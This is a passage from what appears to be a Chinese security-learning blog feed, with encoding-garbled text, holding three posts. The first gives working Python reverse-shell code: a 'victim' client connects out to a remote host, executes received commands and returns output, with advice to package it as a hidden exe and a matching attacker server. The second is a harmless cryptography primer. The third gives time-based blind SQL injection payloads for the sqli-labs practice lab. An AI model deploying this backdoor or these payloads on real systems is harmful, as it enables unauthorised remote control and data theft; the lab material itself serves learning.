python">host = <span class="hljs-string">&#x27;8.8.8.8&#x27;</span><br>port = <span class="hljs-number">8888</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run_command</span>(<span class="hljs-params">comm: <span class="hljs-built_in">str</span></span>):<br>    <span class="hljs-keyword">return</span> subprocess.run(shlex.split(comm), shell=<span class="hljs-literal">True</span>, stdout=subprocess.PIPE, stderr=subprocess.PIPE)<br><br><br>client = socket.socket()<br>client.connect((host, port))<br><br><span class="hljs-comment"># å—å®³è€…æ¥æ”¶æŒ‡ä»¤ï¼Œå¹¶æ‰§è¡ŒæŒ‡ä»¤ï¼Œå¹¶è¿”å›ç»“æœ</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    cmd = client.recv(<span class="hljs-number">1024</span>).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)  <span class="hljs-comment"># å—å®³è€…æ¥æ”¶æŒ‡ä»¤</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;[*]æ‰§è¡Œå‘½ä»¤\t<span class="hljs-subst">&#123;cmd&#125;</span>&#x27;</span>)<br>    info = run_command(cmd).stdout.decode(<span class="hljs-string">&#x27;gbk&#x27;</span>).strip()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;[*]å‘½ä»¤æ‰§è¡Œç»“æœï¼š\t<span class="hljs-subst">&#123;info&#125;</span>&#x27;</span>)<br>    client.send(info.encode(<span class="hljs-string">&#x27;gbk&#x27;</span>))<br><br><span class="hljs-comment">#      pyinstaller -F -w å®¢æˆ·ç«¯.py  å°†å—å®³è€…çš„pyæ–‡ä»¶æ‰“åŒ…ä¸ºexe</span><br></code></pre></td></tr></table></figure><p><strong>æœåŠ¡ç«¯ä»£ç æ€è·¯ï¼š</strong></p><p>1.é¦–å…ˆæˆ‘ä»¬éœ€è¦åˆ©ç”¨socketåœ¨æœ¬åœ°ç«¯å£å¼€å¯ç›‘å¬ï¼Œè®©å®¢æˆ·ç«¯ä¸»åŠ¨è¿è¿‡æ¥ã€‚</p><p>(ä¸ºä»€ä¹ˆè¦å°†æœåŠ¡ç«¯è®¾ç½®åœ¨æœ¬åœ°ï¼Ÿ      åŸå› ï¼šå¦‚æœæˆ‘ä»¬ä¸»åŠ¨å»å¯¹é¶æœºè¿›è¡Œè¿æ¥ï¼Œè¿™æ—¶å€™é˜²æŠ¤è®¾å¤‡ä¼°è®¡å°±ä¼šç»™ä½ ç›´æ¥æ€äº†ã€‚ä½†æ˜¯æˆ‘ä»¬è®©é¶æœºä¸»åŠ¨è¿è¿‡æ¥çš„è¯ï¼Œé˜²æŠ¤è®¾å¤‡å°±ä¼šä»¥ä¸ºæ˜¯é¶æœºç”¨æˆ·çš„ä¸»åŠ¨è¡Œä¸ºæ“ä½œï¼Œå‡ºç«™è§„åˆ™ä¸ä¼šåƒè¿›ç«™é‚£æ ·ä¸¥æ ¼ã€‚)</p><p>2.å¦‚æœæˆ‘ä»¬ä¸æ­¢è¿æ¥ä¸€å°é¶æœºçš„è¯å¯ä»¥åœ¨æœ¬åœ°å¼€å¯åˆå§‹åŒ–è¿æ¥æ•°é‡ã€‚</p><p>3.å¦‚æœå®¢æˆ·ç«¯é•¿æ—¶é—´æœªè¿æ¥æ€ä¹ˆåŠï¼Ÿâ€”â€”å¯ä»¥åœ¨æœåŠ¡ç«¯è®¾ç½®é˜»å¡æ¨¡å¼ï¼Œä¸€ç›´ç­‰å¾…å®¢æˆ·ç«¯é“¾æ¥</p><p>4.æˆ‘ä»¬éœ€è¦å‘é€ç»™å®¢æˆ·ç«¯é¶æœºè¦æ‰§è¡Œçš„å‘½ä»¤</p><p>5.æˆ‘ä»¬éœ€è¦æ¥æ”¶å®¢æˆ·ç«¯æ‰§è¡Œå‘½ä»¤çš„ç»“æœ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python">server = socket.socket()<br>server.bind((<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, <span class="hljs-number">8888</span>))  <span class="hljs-comment"># åœ¨æœ¬åœ°çš„8888ç«¯å£è®¾ç½®ç›‘å¬</span><br>server.listen(<span class="hljs-number">3</span>)  <span class="hljs-comment"># åˆå§‹åŒ–å¯è¿æ¥æ•°é‡ä¸º 3</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[*]æ§åˆ¶ç«¯è¿è¡Œä¸­ï¼Œç­‰å¾…å—å®³è€…è¿æ¥......&#x27;</span>)<br>pip, b = server.accept()  <span class="hljs-comment"># ç­‰å¾…å®¢æˆ·ç«¯è¿æ¥ï¼Œå¦‚æœå®¢æˆ·ç«¯æœªè¿æ¥ï¼Œå¤„äºé˜»å¡çŠ¶æ€</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;[*]æ¥æ”¶åˆ°æ¥è‡ªå®¢æˆ·ç«¯<span class="hljs-subst">&#123;b[<span class="hljs-number">0</span>]&#125;</span>,ç«¯å£<span class="hljs-subst">&#123;b[<span class="hljs-number">1</span>]&#125;</span>çš„è¿æ¥è¯·æ±‚&#x27;</span>)<br><br><span class="hljs-comment"># å‘é€æŒ‡ä»¤ï¼Œæ¥æ”¶æ‰§è¡Œç»“æœ</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    cmd = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;&gt; &#x27;</span>).strip()  <span class="hljs-comment"># æ¥æ”¶æ”»å‡»è€…ä¼ å…¥çš„æŒ‡ä»¤</span><br>    pip.send(cmd.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))  <span class="hljs-comment"># ä¸‹è¾¾æŒ‡ä»¤ç»™å—å®³è€…</span><br>    info = pip.recv(<span class="hljs-number">4096</span>).strip().decode(<span class="hljs-string">&#x27;gbk&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;[*]---------------æ‰§è¡Œç»“æœ-----------------&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(info)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;[*]---------------æ‰§è¡Œç»“æœ-----------------&#x27;</span>)<br><br>**************************************<br>èœé¸¡åˆ†äº«å­¦ä¹ ç‚¹æ»´ï¼Œæœ›å¤§ä½¬ä»¬å¤šå¤šåŒ…æ¶µã€‚<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>å¯†ç å­¦ç®€å•åˆ†æ</title>
    <link href="/2023/07/21/%E5%AF%86%E7%A0%81%E5%AD%A6%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/"/>
    <url>/2023/07/21/%E5%AF%86%E7%A0%81%E5%AD%A6%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<p><strong>é¦–å…ˆç®€å•è®¤è¯†ä¸€ä¸‹httpså»ºç«‹è¿‡ç¨‹ï¼š</strong></p><p>ç¬¬ä¸€æ­¥ï¼šå®¢æˆ·ç«¯å‘æœåŠ¡ç«¯å‘èµ·è¯·æ±‚</p><p>ç¬¬äºŒæ­¥ï¼šæœåŠ¡ç«¯å“åº”è¯·æ±‚ï¼Œä¼šå¸¦ç€æ•°å­—è¯ä¹¦ï¼ˆåŒ…å«æœåŠ¡ç«¯å…¬é’¥ï¼‰</p><p>ç¬¬ä¸‰æ­¥ï¼šå®¢æˆ·ç«¯æ”¶åˆ°åï¼Œå–å‡ºå…¬é’¥ï¼Œå¹¶ç”Ÿæˆéšæœºç KEYï¼ˆè¿™é‡Œçš„KEYå°±æ˜¯åŒæ–¹åé¢é€šä¿¡çš„å¯¹ç§°åŠ å¯†å¯†é’¥ï¼‰ï¼Œç”¨æœåŠ¡ç«¯å…¬é’¥å¯¹KEYè¿›è¡ŒåŠ å¯†ï¼Œè¿”å›ç»™æœåŠ¡ç«¯</p><p>ç¬¬å››æ­¥ï¼šæœåŠ¡ç«¯æ”¶åˆ°ç”¨è‡ªå·±çš„ç§é’¥è§£å¯†ï¼Œæ‹¿å‡ºKEY</p><p>ç¬¬äº”æ­¥ï¼šè¿”å›ç»™å®¢æˆ·ç«¯ç”¨KEYåŠ å¯†çš„æ•°æ®</p><p>ç¬¬å…­æ­¥ï¼šå®¢æˆ·ç«¯ç”¨KEYè¿›è¡Œè§£å¯†ã€‚</p><p>å…¶ä¸­ç”¨åˆ°äº†ä¸¤ç§åŠ å¯†æ–¹å¼ï¼Œä¸€ç§æ˜¯å¯¹ç§°åŠ å¯†ï¼ˆKEYï¼‰ï¼Œä¸€ç§æ˜¯éå¯¹ç§°åŠ å¯†ï¼ˆå…¬ç§é’¥ï¼‰</p><p>å…¶å®å¯¹ç§°å’Œéå¯¹ç§°å°±çœ‹æœ‰å‡ æŠŠé’¥åŒ™ï¼š</p><p>ä¸€æŠŠé’¥åŒ™ä¸¤ä¸ªäººç”¨å°±æ˜¯å¯¹ç§°åŠ å¯†ã€‚</p><p>ä¸€äººä¸¤æŠŠé’¥åŒ™å°±æ˜¯éå¯¹ç§°åŠ å¯†ã€‚</p><p>ä¸‹é¢æˆ‘ä»¬åˆ†åˆ«æŒ‘ä¸€ä¸ªæµ…æµ…çš„åˆ†æä¸€ä¸‹</p><p><strong>éå¯¹ç§°åŠ å¯†ï¼š</strong></p><p>éå¯¹ç§°åŠ å¯†ä¹Ÿå«å…¬å¼€å¯†ç ä½“åˆ¶ï¼Œæ¯ä¸ªäººéƒ½æœ‰ä¸€å¯¹å¯†é’¥ã€‚</p><p>ä¸€ä¸ªæ˜¯å…¬é’¥ï¼ˆPKï¼‰ï¼Œä¸€ä¸ªæ˜¯ç§é’¥ï¼ˆSKï¼‰</p><p>ä¸¤ä¸ªå¯†é’¥ç›´æ¥å­˜åœ¨æŸç§ç®—æ³•è”ç³»ï¼Œä½†ç”±ä¸€ä¸ªå¯†é’¥æ²¡åŠæ³•æˆ–è€…å¾ˆéš¾æ¨å¯¼å‡ºå¦ä¸€ä¸ªå¯†é’¥ã€‚</p><p>é¦–å…ˆâ€œå…¬é’¥â€é¡¾åæ€ä¹‰å°±æ˜¯å…¬å¼€çš„å¯†é’¥ï¼Œä»–å¯ä»¥è¢«ä»»ä½•äººçœ‹åˆ°ã€‚</p><p>â€œç§é’¥â€å°±æ˜¯ç§äººçš„é’¥åŒ™ï¼Œä¹Ÿå°±æ˜¯è¯´åªæœ‰æŸä¸ªäººæ‰æœ‰ï¼Œè€Œä¸”ä»–ä¸ä¼šè¢«ä»»ä½•äººçœ‹åˆ°ã€‚</p><ul><li>å…¬é’¥åŠ å¯†ï¼Œç§é’¥è§£å¯†â€”â€”ç›®çš„æ˜¯ä¸ºäº†ä¿è¯å°†æ•°æ®å‘ç»™å…·ä½“çš„äººã€‚ï¼ˆä¿å¯†é€šä¿¡ï¼‰</li></ul><p>åŠ©è§£ï¼šå› ä¸ºå…¬é’¥Aæ˜¯å¤§å®¶éƒ½èƒ½çœ‹åˆ°çš„ï¼Œæ¯ä¸ªäººéƒ½å¯ä»¥ç”¨å…¬é’¥Aå¯¹è‡ªå·±çš„æ•°æ®è¿›è¡ŒåŠ å¯†ï¼Œä½†æ˜¯åªæœ‰æ‹¿ç€å¯¹åº”ç§é’¥Açš„äººæ‰èƒ½è§£å¼€ã€‚å…¶ä»–äººç”¨è‡ªå·±çš„ç§é’¥æ˜¯æ²¡åŠæ³•è§£å¼€ç»è¿‡å…¬é’¥AåŠ å¯†çš„æ•°æ®ã€‚</p><ul><li>ç§é’¥åŠ å¯†ï¼Œå…¬é’¥è§£å¯†â€”â€”ç›®çš„æ˜¯ä¸ºäº†ä¿è¯æ•°æ®ç”±æŸä¸ªå…·ä½“çš„äººå‘å‡ºçš„ã€‚ï¼ˆæ•°å­—ç­¾åè®¤è¯ï¼‰</li></ul><p>åŠ©è§£ï¼šå› ä¸ºç§é’¥Aåªæœ‰ä¸€ä¸ªç‰¹å®šçš„äººï¼ˆå°æ˜ï¼‰æœ‰ï¼Œå°æ˜ç”¨è‡ªå·±çš„ç§é’¥å¯¹æ•°æ®è¿›è¡ŒåŠ å¯†ã€‚å¤§å®¶ç”¨æ‰€æœ‰çš„å…¬é’¥å¯¹æ•°æ®è¿›è¡Œè§£å¯†ï¼Œä½†å‘ç°åªæœ‰å…¬é’¥Aæ‰èƒ½è§£å¼€åŠ å¯†çš„æ•°æ®ã€‚æ‰€ä»¥å¤§å®¶å¯ä»¥çŸ¥é“è¿™ä¸ªæ•°æ®æ˜¯ç”±å°æ˜å‘å‡ºçš„ã€‚</p><p>å…¬é’¥åŠ å¯†ä½“ç³»é‡‡å–å°†å…¬é’¥å’Œå…¬é’¥çš„ä¸»äººåå­—è”ç³»åœ¨ä¸€èµ·çš„æ–¹æ³•ï¼Œå†è¯·ä¸€ä¸ªæœ‰ä¿¡èª‰çš„å…¬æ­£æƒå¨æœºæ„å¯¹æ¯ä¸ªå…¬é’¥å’Œæ‰€æœ‰è€…èº«ä»½è¿›è¡Œç¡®è®¤ï¼Œç¡®è®¤åçš„å…¬é’¥ä¿¡æ¯åŠ ä¸Šè¿™ä¸ªæƒå¨æœºæ„çš„ç­¾åï¼Œå°±å½¢æˆäº†æ•°å­—è¯ä¹¦ï¼Œä¹Ÿç§°ä¸ºè¯ä¹¦ã€‚</p><p>æœ‰äº†æ•°å­—è¯ä¹¦ä¹‹åï¼Œäº’è”ç½‘ä¸Šçš„åºå¤§ç”¨æˆ·ç¾¤ä¹‹é—´å¯ä»¥é€šè¿‡æƒå¨æœºæ„å»ºç«‹èµ·åŸºæœ¬çš„ä¿¡ä»»å…³ç³»ã€‚</p><p>å…¬å¼€å¯†ç ä½“åˆ¶çš„ä¼˜ç‚¹ï¼š</p><ol><li>å¯†é’¥åˆ†é…ç›¸å¯¹ç®€å•ï¼Œä¸éœ€è¦å¤æ‚çš„æµç¨‹ï¼›</li><li>å¯†é’¥çš„ä¿å­˜é‡å°‘ï¼Œä¸”ç§é’¥å’Œå…¬é’¥åˆ†åˆ«å­˜å‚¨ï¼›</li><li>å¯ä»¥å®ç°äº’ä¸ç›¸è¯†çš„äººä¹‹é—´è¿›è¡Œç§äººé€šä¿¡æ—¶çš„ä¿å¯†æ€§è¦æ±‚ï¼›</li><li>å¯ä»¥å®Œæˆé€šä¿¡åŒæ–¹çš„æ•°å­—ç­¾åå’Œæ•°å­—èº«ä»½é‰´åˆ«ã€‚</li></ol><p><strong>RSAï¼ˆéå¯¹ç§°ï¼‰ï¼š</strong></p><p>RSAä½“åˆ¶åŸºäºâ€œå¤§æ•°åˆ†è§£å’Œç´ æ•°(prime number)æ£€æµ‹â€è¿™ä¸€è‘—åæ•°è®ºéš¾é¢˜ï¼š</p><p>å°†ä¸¤ä¸ªå¤§ç´ æ•°ç›¸ä¹˜ååˆ†å®¹æ˜“ï¼Œä½†å°†è¯¥ä¹˜ç§¯åˆ†è§£ä¸ºä¸¤ä¸ªå¤§ç´ æ•°å› å­å´æç«¯å›°éš¾ï¼›</p><p>ç´ æ•°æ£€æµ‹å°±æ˜¯åˆ¤å®šä¸€ä¸ªç»™å®šçš„æ­£æ•´æ•°æ˜¯å¦ä¸ºç´ æ•°</p><p>æ•´æ•°çš„å› å­åˆ†è§£é—®é¢˜ï¼šå°†ä¸¤ä¸ªç´ æ•°11927å’Œ20903ç›¸ä¹˜ï¼Œå¯ä»¥å¾ˆå®¹æ˜“åœ°å¾—å‡º249310081ã€‚ä½†æ˜¯å°†å®ƒä»¬çš„ç§¯249310081åˆ†è§£å› å­å¾—å‡ºä¸Šè¿°ä¸¤ä¸ªç´ æ•°å´è¦å›°éš¾å¾—å¤šã€‚</p><p>RSAç®—æ³•ä¹‹æ‰€ä»¥å…·æœ‰å®‰å…¨æ€§ï¼Œæ˜¯åŸºäºæ•°è®ºä¸­çš„ä¸€ä¸ªç‰¹æ€§äº‹å®ï¼šå°†ä¸¤ä¸ªå¤§çš„ç´ æ•°åˆæˆä¸€ä¸ªå¤§æ•°å¾ˆå®¹æ˜“ï¼Œè€Œé€†è¿‡ç¨‹åˆ™éå¸¸å›°éš¾ã€‚</p><p><strong>RSAçš„ä¼˜ç¼ºç‚¹ï¼š</strong></p><p><strong>ä¼˜ç‚¹ï¼š</strong></p><p>1.ä¿å¯†å¼ºåº¦é«˜</p><p>2.å¯†é’¥åˆ†é…åŠç®¡ç†ç®€ä¾¿</p><p>3.å¯ä»¥ç”¨äºæ•°å­—ç­¾åå®ç°èº«ä»½è®¤è¯</p><p><strong>ç¼ºç‚¹ï¼š</strong></p><ol><li>è¿ç®—å¤æ‚ï¼Œé€Ÿåº¦æ…¢ï¼šç¡¬ä»¶å®ç°æ—¶ï¼ŒRSAæ¯”DESè¦æ…¢å¤§çº¦1000å€ï¼Œè½¯ä»¶å®ç°æ—¶ï¼ŒRSAæ¯”DESè¦æ…¢å¤§çº¦100å€ã€‚</li></ol><p><strong>å…¶ä»–éå¯¹ç§°åŠ å¯†ï¼šDSAï¼ŒECC</strong></p><p><strong>å¯¹ç§°å¯†ç ä½“åˆ¶ï¼š</strong></p><p>å¯¹ç§°å¯†ç ä½“åˆ¶å¯¹æ˜æ–‡åŠ å¯†æœ‰ä¸¤ç§æ–¹å¼ï¼š</p><p><strong>åºåˆ—å¯†ç ï¼ˆæµå¯†ç ï¼ŒStream Cipherï¼‰</strong></p><p><strong>åˆ†ç»„å¯†ç  (Block Cipher)</strong></p><p>.</p><p>.</p><p><strong>åºåˆ—å¯†ç åŸç†ï¼š</strong></p><p>ä»¥æ˜æ–‡çš„æ¯”ç‰¹ä¸ºåŠ å¯†å•ä½ï¼Œç”¨æŸä¸€ä¸ªä¼ªéšæœºåºåˆ—ä½œä¸ºåŠ å¯†å¯†é’¥ï¼Œä¸æ˜æ–‡è¿›è¡Œå¼‚æˆ–è¿ç®—ï¼Œè·å¾—å¯†æ–‡åºåˆ—ï¼›</p><p>åœ¨æ¥æ”¶ç«¯ï¼Œç”¨ç›¸åŒçš„éšæœºåºåˆ—ä¸å¯†æ–‡è¿›è¡Œå¼‚æˆ–è¿ç®—ä¾¿å¯æ¢å¤æ˜æ–‡åºåˆ—ã€‚</p><p><img src="https://ice.frostsky.com/2023/08/15/32d54609d554518d7bf3cb33e93c38ba.png" alt="img"></p><p>åºåˆ—å¯†ç ç®—æ³•çš„å®‰å…¨å¼ºåº¦å®Œå…¨å–å†³äºä¼ªéšæœºåºåˆ—çš„å¥½åï¼Œå› æ­¤å…³é”®é—®é¢˜æ˜¯ï¼šä¼ªéšæœºåºåˆ—å‘ç”Ÿå™¨çš„è®¾è®¡ã€‚</p><p><strong>ä¼˜ç‚¹ï¼š</strong></p><p>1.é”™è¯¯æ‰©æ•£å°ï¼ˆä¸€ä¸ªç å…ƒå‡ºé”™ä¸å½±å“å…¶å®ƒç å…ƒï¼‰ï¼›</p><p>2.é€Ÿåº¦å¿«ã€å®æ—¶æ€§å¥½ï¼›</p><p>3.å®‰å…¨ç¨‹åº¦é«˜ã€‚</p><p><strong>ç¼ºç‚¹ï¼š</strong></p><p>å¯†é’¥éœ€è¦åŒæ­¥</p><p><strong>åˆ†ç»„å¯†ç  (Block Cipher)</strong></p><p>åˆ†ç»„å¯†ç ï¼ˆ Block Cipherï¼‰åŠ å¯†æ˜¯åœ¨å¯†é’¥çš„æ§åˆ¶ä¹‹ä¸‹ï¼Œå°†å®šé•¿çš„æ˜æ–‡å—è½¬æ¢æˆç­‰é•¿å¯†æ–‡çš„æŠ€æœ¯ã€‚å½“å‰çš„è®¸å¤šåˆ†ç»„å¯†ç é‡‡ç”¨64ä½åˆ†ç»„å¤§å°ï¼Œä½†ä¸ºäº†æé«˜å®‰å…¨æ€§ï¼Œè¿™ä¸€é•¿åº¦å¯èƒ½ä¼šå¢åŠ ã€‚</p><p>åŸç†ï¼š</p><p>å°†æ˜æ–‡åºåˆ—ä»¥å›ºå®šé•¿åº¦ï¼ˆ Fixed lengthï¼‰è¿›è¡Œåˆ†ç»„ï¼Œæ¯ä¸€ç»„æ˜æ–‡ç”¨ç›¸åŒçš„å¯†é’¥å’ŒåŠ å¯†å‡½æ•°è¿›è¡Œè¿ç®—ã€‚</p><p><img src="https://ice.frostsky.com/2023/08/15/a832bce40945c4810a575442114e45f9.png" alt="img"></p><p>ä¼˜ç¼ºç‚¹ï¼š</p><p>å®¹æ˜“æ£€æµ‹å‡ºå¯¹ä¿¡æ¯çš„ç¯¡æ”¹ï¼Œä¸”ä¸éœ€è¦å¯†é’¥åŒæ­¥ï¼Œå…·æœ‰å¾ˆå¼ºçš„é€‚åº”æ€§ï¼›</p><p>ï¼ˆä¸åºåˆ—å¯†ç ç›¸æ¯”ï¼‰åˆ†ç»„å¯†ç åœ¨è®¾è®¡ä¸Šçš„è‡ªç”±åº¦å°ã€‚</p><p>æœ€å…¸å‹åˆ†ç»„å¯†ç æ˜¯DESæ•°æ®åŠ å¯†æ ‡å‡†ï¼Œå®ƒæ˜¯å•é’¥å¯†ç ä½“åˆ¶çš„æœ€æˆåŠŸçš„ä¾‹å­ã€‚</p><p><strong>DESï¼ˆå¯¹ç§°ï¼‰ï¼š</strong></p><p>åŠ å¯†è¿‡ç¨‹ï¼š</p><p><img src="https://ice.frostsky.com/2023/08/15/a6837b71754583088273f5ca9cf62dd9.png" alt="img"></p><p>åˆå§‹ç½®æ¢å¯¹è¾“å…¥çš„æ¯”ç‰¹ä½ç½®è¿›è¡Œè°ƒæ•´ã€‚</p><p>é€šè¿‡åˆå§‹ç½®æ¢è¡¨å®ç°</p><p>åˆå§‹ç½®æ¢çš„åŠŸèƒ½</p><p>ä¸¾ä¾‹æ¥çœ‹ï¼Œè¾“å…¥ä¸º8ä½01110010</p><p>åˆå§‹ç½®æ¢è¡¨ä¸ºï¼š</p><p><img src="https://ice.frostsky.com/2023/08/15/85601c7734ef08860e0b2a090505c5b7.png" alt="img"></p><p>åˆ™è¾“å‡ºä¸ºï¼š10001101</p><p>åˆå§‹ç½®æ¢æ˜¯å›ºå®šå…¬å¼€çš„ï¼Œå› æ­¤æ²¡æœ‰å¯†ç çš„æ„ä¹‰ã€‚</p><p><img src="https://ice.frostsky.com/2023/08/15/53247bac8ebef1ea9f773339ce07394d.png" alt="img"></p><p>DESç³»ç»Ÿçš„ä¿å¯†æ€§ä¸»è¦å–å†³äºä»€ä¹ˆ?</p><p>å¯†é’¥çš„å®‰å…¨æ€§ ã€‚</p><p>å¦‚ä½•å°†å¯†é’¥å®‰å…¨ã€å¯é åœ°åˆ†é…ç»™é€šä¿¡åŒæ–¹ï¼Œåœ¨ç½‘ç»œé€šä¿¡æ¡ä»¶ä¸‹å°±æ›´ä¸ºå¤æ‚ï¼ŒåŒ…æ‹¬å¯†é’¥äº§ç”Ÿã€åˆ†é…ã€å­˜å‚¨ã€é”€æ¯ç­‰å¤šæ–¹é¢çš„é—®é¢˜ï¼Œç»Ÿç§°ä¸º<strong>å¯†é’¥ç®¡ç†</strong>ã€‚</p><p>å¯†é’¥ç®¡ç†æ˜¯å½±å“DESç­‰å•é’¥å¯†ç ä½“åˆ¶å®‰å…¨çš„å…³é”®å› ç´ ã€‚å› ä¸ºå³ä½¿å¯†ç ç®—æ³•å†å¥½ï¼Œè‹¥å¯†é’¥ç®¡ç†å¤„ç†ä¸å½“ï¼Œä¹Ÿå¾ˆéš¾ä¿è¯ç³»ç»Ÿçš„å®‰å…¨æ€§ã€‚</p><p><strong>å…¶ä»–å¯¹ç§°åŠ å¯†ç®—æ³•ï¼š3DESï¼ŒAES</strong></p>]]></content>
    
    
    <categories>
      
      <category>å¯†ç å­¦</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>å»¶æ—¶æ³¨å…¥çš„å‡ ç§æ–¹å¼</title>
    <link href="/2023/07/21/%E5%BB%B6%E6%97%B6%E6%B3%A8%E5%85%A5%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/"/>
    <url>/2023/07/21/%E5%BB%B6%E6%97%B6%E6%B3%A8%E5%85%A5%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/</url>
    
    <content type="html"><![CDATA[<p>æ—¶é—´ç›²æ³¨æ˜¯ç›²æ³¨çš„ä¸€ç§ï¼Œåˆ©ç”¨çš„åœºæ™¯æ˜¯å½“ç›®æ ‡æ— æ³•ä½¿ç”¨å¸ƒå°”ç›²æ³¨è·å¾—æ•°æ®å¯ä»¥ä½¿ç”¨è¿™ç§åŸºäºæ—¶é—´çš„å»¶æ—¶æ³¨å…¥ï¼Œé€šè¿‡é¡µé¢å›æ˜¾å»¶æ—¶æ¥åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ³¨å…¥ã€‚</p><p>åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ—¶é—´æ³¨å…¥ï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://www.xxxxxxx.com/<span class="hljs-number">1</span>.php?id=<span class="hljs-number">1</span> &#x27; and if(num1,num2,num3)--+<br></code></pre></td></tr></table></figure><p>è¯­ä¹‰ï¼šå¦‚æœnum1ä¸ºtrueåˆ™è¿”å›num2,å¦åˆ™è¿”å›num3</p><p>è‹¥éœ€è¦åˆ¤æ–­å‚æ•°æ˜¯å¦å­˜åœ¨æ³¨å…¥å°±å¯ä»¥ï¼š</p><p>num1â€”â€”&gt;true</p><p>num2â€”â€”&gt;sleep(5)</p><p>num3â€”â€”&gt;sleep(0)</p><h2 id="ä¸€ã€åŸºäºsleepçš„æ³¨å…¥"><a href="#ä¸€ã€åŸºäºsleepçš„æ³¨å…¥" class="headerlink" title="ä¸€ã€åŸºäºsleepçš„æ³¨å…¥"></a>ä¸€ã€åŸºäºsleepçš„æ³¨å…¥</h2><p><code>sleep()</code>æ˜¯æ•°æ®åº“ä¸­çš„ä¸€ä¸ªå‡½æ•°ï¼Œå¯ä»¥é€šè¿‡ç»™<code>sleep()</code>ä¼ å…¥æ•°å­—ä»è€Œå¯¼è‡´æŸ¥è¯¢å»¶æ—¶ã€‚</p><p>æ•…å¯ä»¥æ„é€ å¦‚ä¸‹payloadçŒœè§£æ•°æ®åº“é•¿åº¦ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span>â€² <span class="hljs-keyword">and</span> if(length(schema()) <span class="hljs-operator">=</span> &#123;<span class="hljs-number">1</span>&#125;,sleep(<span class="hljs-number">5</span>),sleep(<span class="hljs-number">0</span>))â€“<span class="hljs-operator">+</span><br></code></pre></td></tr></table></figure><p>å¯ä»¥é€šè¿‡ä¸æ–­å˜åŒ–æ•°å­—1ï¼Œä»è€Œè¿›ä¸€æ­¥çŒœè§£æ•°æ®åº“é•¿åº¦ã€‚</p><p>å¯ä»¥æ„é€ å¦‚ä¸‹payloadçŒœè§£æ•°æ®åº“çš„åº“åï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id <span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and if(substr(schema(),&#123;1&#125;, 1) = &#x27;</span>&#123;chr(<span class="hljs-number">32</span>)&#125;<span class="hljs-string">&#x27; , sleep(2), sleep(0)) --+</span><br></code></pre></td></tr></table></figure><p>**<code>chr()</code>**ï¼šå°†ASCIIç è½¬ä¸ºå¯¹åº”çš„å­—ç¬¦</p><p>**<code>substr(a,b,c)</code>**ï¼š ä»bä½ç½®å¼€å§‹ï¼Œæˆªå–å­—ç¬¦ä¸²açš„é•¿åº¦ä¸ºc</p><p>å¯ä»¥é€šè¿‡å˜åŒ–1å’Œ32ä»è€Œç¡®å®šæ•°æ®åº“åº“å</p><p><strong>é™„ä¸Šsqlilabsçš„Less-9çš„ç›²æ³¨è„šæœ¬å¦‚ä¸‹ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span 